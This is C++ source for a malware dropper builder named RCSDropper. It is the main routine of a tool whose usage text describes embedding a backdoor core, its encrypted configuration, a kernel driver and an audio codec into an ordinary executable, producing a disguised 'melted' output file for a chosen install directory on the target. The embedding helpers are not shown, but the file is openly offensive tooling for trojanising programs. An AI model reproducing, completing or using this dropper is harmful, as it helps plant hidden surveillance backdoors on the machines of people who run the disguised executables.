// RCSDropper.cpp : Defines the entry point for the console application.
//

#pragma warning ( disable: 4996 )

#include <string>
#include <iostream>
using namespace std;

#include <time.h>

#include <xercesc/util/PlatformUtils.hpp>
#include <xercesc/util/XMLString.hpp>

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "common.h"
#include "dropper.h"

#include "Manifest.h"
#include "MeltFile.h"

int main(int argc, char* argv[])
{
	BOOL ret = FALSE;
	MelterStruct MS;

	srand( time(NULL) );
	
	memset(&MS, 0, sizeof(MelterStruct));
	MS.manifest = FALSE;
	
	if (argc != 9) {
		printf("ERROR: \n");
		printf("  usage:  RCSWin32Dropper.exe  <core> <conf> <driver> <codec> <instdir> <manifest> <input> <output>\n\n");
		printf("  <core> is the backdoor core\n");
		printf("  <conf> is the backdoor encrypted configuration\n");
		printf("  <driver> is the kernel driver\n");
		printf("  <codec> is the audio codec\n");
		printf("  <instdir> is the backdoor install directory (on the target)\n");
		printf("  <manifest> is a boolean flag for modifying the manifest\n");
		printf("  <input> is the exe to be melted\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}
	
	/************************************************************************/
	/* PREPARING PARAMETERS                                                 */
	/************************************************************************/
	
	for (int i = 0; i < argc; i++)
		printf("%s\n", argv[i]);
	
	sprintf(MS.core, "%s", argv[1]);

	printf("%s %s\n", argv[1], MS.core);

	sprintf(MS.conf, "%s", argv[2]);
	if (strcmp(argv[3], "null")) {
		sprintf(MS.driver, "%s", argv[3]);
	}
	if (strcmp(argv[4], "null")) {
		sprintf(MS.codec, "%s", argv[4]);
	}
	printf("Instdir = %s\n", argv[5]);
	sprintf(MS.instdir, "%s", argv[5]);

	printf("%s %s\n", argv[5], MS.instdir);

	if (!strcmp(argv[6], "1") )
		MS.manifest = TRUE;
	
	bf::path coreFile = argv[1];
	bf::path configFile = argv[2];
	bf::path driverFile = argv[3];
	bf::path codecFile = argv[4];
	bf::path exeFile = argv[7];
	bf::path outputFile = argv[8];
	
	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	
	if ( !bf::exists(exeFile) ) {
		cout << "Cannot find the input exe file [" << exeFile << "]" << endl;
		return ERROR_EMBEDDING;
	}
	
	if ( !bf::exists(coreFile) ) {
		cout << "Cannot find the core file [" << coreFile << "]" << endl;
		return ERROR_EMBEDDING;
	}
	
	if ( !bf::exists(configFile) ) {
		cout << "Cannot find the config file [" << configFile << "]" << endl;
		return ERROR_EMBEDDING;
	}

	if (MS.driver[0]) {
		if ( !bf::exists(driverFile) ) {
			cout << "Cannot find the driver file [" << driverFile << "]" << endl;
			return ERROR_EMBEDDING;
		}
	}
	
	if (MS.codec[0]) {
		if ( !bf::exists(codecFile) ) {
			cout << "Cannot find the codec file [" << codecFile << "]" << endl;
			return ERROR_EMBEDDING;
		}
	}
	
	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/
	
	printf("Ready to go...\n");
	printf("CORE          [%s]\n", MS.core);
	printf("CONFIGURATION [%s]\n", MS.conf);
	printf("INSTALL DIR   [%s]\n", MS.instdir);
	printf("DRIVER        [%s]\n", (MS.driver) ? MS.driver : "null");
	printf("CODEC         [%s]\n", (MS.codec) ? MS.codec : "null");
	printf("MANIFEST      [%d]\n", MS.manifest);
	cout << "INPUT         [" << exeFile << "]" << endl;
	cout << "OUTPUT        [" << outputFile << "]" << endl << endl;
	
	if ( bf::exists(outputFile) )
		bf::remove(outputFile);
	
	bf::copy_file(exeFile, outputFile);
	if ( !bf::exists(outputFile) ) {
		cout << "Cannot create output file [" << outputFile << "]" << endl;
		return ERROR_OUTPUT;
	}
	
	/************************************************************************/
	/* DROPPER                                                              */
	/************************************************************************/
	
	if (!Manifest::initialize())
		return ERROR_OUTPUT;
	
	try {
		int ret = MeltFile(
		exeFile.string().c_str(),
		outputFile.string().c_str(),
		&MS
		);
	} catch (melting_error &e) {
		cout << e.what() << endl;
		bf::remove(outputFile);
		return ERROR_OUTPUT;
	}catch (...) {
		cout << "UNEXPECTED EXCEPTION!" << endl;
		bf::remove(outputFile);
		return ERROR_OUTPUT;
	}
	
	cout << "Output file melted... ok" << endl;
	
	return 0;
}
